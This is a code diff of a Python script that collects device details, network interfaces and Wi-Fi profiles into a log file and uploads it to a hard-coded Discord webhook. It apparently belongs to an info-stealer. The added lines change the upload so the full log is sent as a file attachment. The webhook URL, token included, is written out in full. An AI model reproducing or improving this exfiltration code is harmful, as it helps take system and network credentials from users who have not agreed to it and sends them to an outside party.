@@ -9,14 +9,15 @@ from datetime import datetime, timedelta
 # Discord Webhook URL
 webhook_url = 'https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA'
 
-# Function to send message to Discord webhook
-def send_to_discord(message):
+# Function to send message to Discord webhook with file attachment
+def send_to_discord_with_file(file_path, message="Log file attached."):
+    files = {'file': open(file_path, 'rb')}
     data = {'content': message}
-    response = requests.post(webhook_url, json=data)
+    response = requests.post(webhook_url, files=files, data=data)
     if response.status_code == 204:
-        print("Message sent successfully to Discord webhook.")
+        print("File sent successfully to Discord webhook.")
     else:
-        print(f"Failed to send message to Discord webhook. Status code: {response.status_code}")
+        print(f"Failed to send file to Discord webhook. Status code: {response.status_code}")
         print(f"Response: {response.text}")
 
 # Function to execute command and capture output
@@ -147,9 +148,14 @@ def write_to_log(file_path, device_info_text, network_interfaces_text, wifi_prof
 
 # Function to send log file to Discord webhook
 def send_log_to_discord(log_file_path):
-    with open(log_file_path, 'r') as f:
-        log_contents = f.read()
-    send_to_discord(log_contents)
+    with open(log_file_path, 'rb') as f:
+        files = {'file': f}
+        response = requests.post(webhook_url, files=files)
+        if response.status_code == 204:
+            print("File sent successfully to Discord webhook.")
+        else:
+            print(f"Failed to send file to Discord webhook. Status code: {response.status_code}")
+            print(f"Response: {response.text}")
 
 # Main function to orchestrate the process
 def main():
